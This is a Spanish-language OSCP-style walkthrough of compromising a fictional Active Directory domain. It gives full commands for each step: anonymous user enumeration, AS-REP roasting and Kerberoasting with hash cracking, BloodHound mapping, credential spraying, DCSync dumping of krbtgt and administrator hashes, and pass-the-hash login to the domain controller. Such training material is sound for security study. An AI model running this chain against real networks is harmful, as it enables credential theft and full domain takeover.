# Ejemplo: Comprometer un Dominio Active Directory

Segundo walkthrough de ejemplo, esta vez de un **entorno Active Directory** (el tipo de escenario que cae en el OSCP y en la mayoría de certificaciones modernas). Como el otro [ejemplo](./Ejemplo%20Resolver%20una%20M%C3%A1quina%20Paso%20a%20Paso.md), las IPs y nombres son inventados; lo importante es **la cadena de razonamiento**.

> **Nota:** dominio `corp.local`, Domain Controller en `10.10.10.100`. Tu IP: `10.10.14.7`. Sincroniza el reloj (`sudo ntpdate 10.10.10.100`) y añade el dominio a `/etc/hosts` antes de empezar.

```flow
Enumeración sin credenciales :: SMB/RPC/LDAP anónimo -> lista de usuarios.
Primeras credenciales :: AS-REP Roasting -> crackear.
Enumeración autenticada :: BloodHound dibuja el camino.
Movimiento lateral :: Kerberoasting + Pass-the-Hash.
Dominio comprometido :: DCSync del krbtgt.
```

---

## 1. Reconocimiento

```bash
nmap -p- --open -sS --min-rate 2000 -n -Pn 10.10.10.100 -oG allPorts
nmap -sCV -p53,88,135,139,389,445,636,3268,5985 10.10.10.100 -oN targeted
```

Puertos `53 + 88 + 389 + 445` → es un **Domain Controller**. Añadimos el dominio:

```bash
echo "10.10.10.100 corp.local dc01.corp.local" | sudo tee -a /etc/hosts
```

---

## 2. Enumeración sin credenciales

Sesión nula por SMB/RPC para sacar usuarios:

```bash
netexec smb 10.10.10.100 -u '' -p '' --rid-brute | grep SidTypeUser
# y/o:
rpcclient -U "" -N 10.10.10.100 -c "enumdomusers"
```

Obtenemos una lista: `administrator, jsmith, mwallace, svc_sql, backupadmin...`. La guardamos en `users.txt`. → notas [RPC](../Enumeraci%C3%B3n%20y%20Explotaci%C3%B3n%20de%20Protocolos/Protocolo%20RPC.md), [LDAP](../Enumeraci%C3%B3n%20y%20Explotaci%C3%B3n%20de%20Protocolos/Protocolo%20LDAP.md).

---

## 3. Primeras credenciales — AS-REP Roasting

Probamos qué usuarios no requieren preautenticación (sin necesitar contraseña):

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.100 -no-pass
```

`mwallace` es AS-REP roasteable. Crackeamos su hash:

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# mwallace:Autumn2023!
```

→ nota [Kerberoasting y AS-REP](../Active%20Directory/Kerberoasting%20y%20AS-REP%20Roasting.md).

> **Consejo:** AS-REP Roasting es el ataque perfecto para arrancar: **no necesita credenciales previas**, solo la lista de usuarios. Siempre que tengas usuarios de dominio, pruébalo.

---

## 4. Enumeración autenticada — BloodHound

Con la primera credencial, mapeamos el dominio:

```bash
bloodhound-python -u mwallace -p 'Autumn2023!' -d corp.local -ns 10.10.10.100 -c All --zip
```

Importamos en BloodHound, marcamos `mwallace` como *owned* y ejecutamos **"Shortest Paths from Owned Principals"**. El grafo muestra:

```pipeline
mwallace -> Kerberoastable: svc_sql -> MemberOf: Server Admins -> DCSync
```

→ nota [BloodHound](../Active%20Directory/BloodHound.md).

---

## 5. Movimiento lateral — Kerberoasting

BloodHound marcó `svc_sql` como kerberoasteable. Pedimos su ticket y lo crackeamos:

```bash
impacket-GetUserSPNs corp.local/mwallace:'Autumn2023!' -dc-ip 10.10.10.100 -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# svc_sql:Password1!
```

Comprobamos dónde vale esa cuenta:

```bash
netexec smb 10.10.10.0/24 -u svc_sql -p 'Password1!'
# 10.10.10.100  (Pwn3d!)   <- admin local en el DC
```

→ nota [Movimiento Lateral](../Active%20Directory/Movimiento%20Lateral.md).

---

## 6. Dominio comprometido — DCSync

`svc_sql` pertenece a un grupo con derechos de replicación (lo dijo BloodHound). Volcamos los hashes del dominio:

```bash
impacket-secretsdump corp.local/svc_sql:'Password1!'@10.10.10.100 -just-dc-user krbtgt
impacket-secretsdump corp.local/svc_sql:'Password1!'@10.10.10.100 -just-dc-user administrator
```

Con el hash del **administrador del dominio**, Pass-the-Hash al DC:

```bash
evil-winrm -i 10.10.10.100 -u administrator -H <hash_NTLM>
# whoami -> corp\administrator   ¡Domain Admin!
```

Y con el hash de **krbtgt** podríamos forjar un Golden Ticket para persistencia total. → nota [DCSync](../Active%20Directory/DCSync%20y%20Volcado%20de%20Credenciales.md).

---

## Lo que deberías llevarte

- **La cadena de AD es casi siempre la misma:** usuarios (sesión nula) → AS-REP → BloodHound → Kerberoasting / abuso de permisos → movimiento lateral → DCSync.
- **Cada credencial reinicia la enumeración** con más contexto (BloodHound se vuelve a correr "owned" con cada cuenta nueva).
- **BloodHound te dibuja el camino:** no ataques a ciegas, sigue las flechas.
- **Detalles que atascan:** la **hora** desincronizada y el **dominio sin resolver** (`/etc/hosts`). Revísalos siempre primero.

---

> **Consejo:** si estás preparando el OSCP, interioriza esta secuencia hasta hacerla en automático. La parte de Active Directory del examen sigue este patrón casi al pie de la letra: enumeras, consigues la primera credencial, mapeas con BloodHound y escalas saltando de cuenta en cuenta hasta Domain Admin.
